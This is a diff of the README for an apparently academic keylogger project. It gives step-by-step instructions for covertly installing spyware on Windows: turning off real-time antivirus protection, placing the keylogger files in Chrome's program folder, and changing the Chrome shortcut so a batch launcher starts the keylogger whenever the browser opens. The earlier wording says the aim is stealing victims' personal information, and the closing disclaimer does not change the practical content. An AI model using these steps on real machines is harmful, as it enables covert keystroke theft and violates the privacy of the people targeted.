@@ -1,34 +1,64 @@
-# Keylogger
-Keylogger - Application and System Security
+# Keylogger - Application and System Security
 
-Keylogger is a topic in the Application and System Security course, focusing on researching and developing spyware that monitors user keystrokes to steal victims' personal information.
+## Overview
 
-## Requirements to run the program
+Keylogger is a research topic in the **Application and System Security** course, focusing on studying and developing spyware that monitors user keystrokes to capture personal information.
 
-- Turn off security software
-- Install Python
-- Install Python pynput library (pip install pynput)
+## Requirements
 
-## How to setup Keylogger
+Before running the program, ensure the following:
 
-# Step 1: Disable Security Software (For Testing Purposes Only)
--> Open Windows Security → Go to Virus & Threat Protection.
--> Temporarily disable Real-time Protection to prevent security software from interfering with the test.
-# Step 2: Locate the Target Application's Installation Folder
--> Right-click on the shortcut of an application (e.g., Chrome).
--> Select Open file location to open the folder containing the application's executable file.
-# Step 3: Move the Keylogger Files to the Application Folder 
--> Copy the files Keylog_V2.pyw and Launcher.bat into the application's folder (e.g., the folder containing chrome.exe).
-# Step 4: Edit Launcher.bat to Launch the Keylogger
--> Right-click on Launcher.bat → Select Edit in Notepad.
--> Add the paths to the target application's executable file on the first line, and the keylogger file on the second line, for example:
-start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
-start "" "C:\Program Files\Google\Chrome\Application\Keylog_V2.pyw"
--> Save the changes.
-# Step 5: Update the Shortcut to Launch via Launcher.bat
--> Go back to the Desktop, right-click on the shortcut of the target application.
--> Select Properties → In the Target field, change the path to point to Launcher.bat.
--> Click Apply → OK to save the changes.
+- **Disable security software** (Windows Defender, Antivirus, etc.)
+- **Install Python** (if not already installed)
+- **Install required libraries**:
+  ```sh
+  pip install pynput
+  ```
 
-At this time, the user just needs to run the Chrome shortcut on the screen and KeyLogger will also be launched at the same time.
+---
+
+## Installation & Setup Guide
+
+### **Step 1: Disable Security Software (For Testing Purposes Only)**
+
+1. Open **Windows Security** → Navigate to **Virus & Threat Protection**.
+2. Temporarily disable **Real-time Protection** to prevent interference.
+
+### **Step 2: Locate the Target Application's Installation Folder**
+
+1. Right-click on the **shortcut** of an application (e.g., Chrome).
+2. Select **Open file location** to access the folder containing the application's executable file.
+
+### **Step 3: Move Keylogger Files to the Application Folder**
+
+1. Copy the following files into the **application's folder** (e.g., the folder containing `chrome.exe`):
+   - `Keylog_V2.pyw`
+   - `Launcher.bat`
+
+### **Step 4: Modify **``** to Launch Keylogger**
+
+1. Right-click on `Launcher.bat` → Select **Edit in Notepad**.
+2. Add the following lines to execute both the application and the keylogger:
+   ```bat
+   start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
+   start "" "C:\Program Files\Google\Chrome\Application\Keylog_V2.pyw"
+   ```
+3. Save and close the file.
+
+### **Step 5: Update the Application Shortcut**
+
+1. Return to the **Desktop**, right-click on the **application shortcut**.
+2. Select **Properties** → Locate the **Target** field.
+3. Replace the target path with the location of `Launcher.bat`.
+4. Click **Apply** → **OK** to save the changes.
+
+---
+
+## Execution
+
+Now, whenever the user **launches the application** (e.g., Chrome) using the **modified shortcut**, the Keylogger will also be executed simultaneously.
+
+> **Disclaimer:** This setup is strictly for educational and testing purposes in a controlled environment. Unauthorized use may violate privacy laws.
+
+---
 
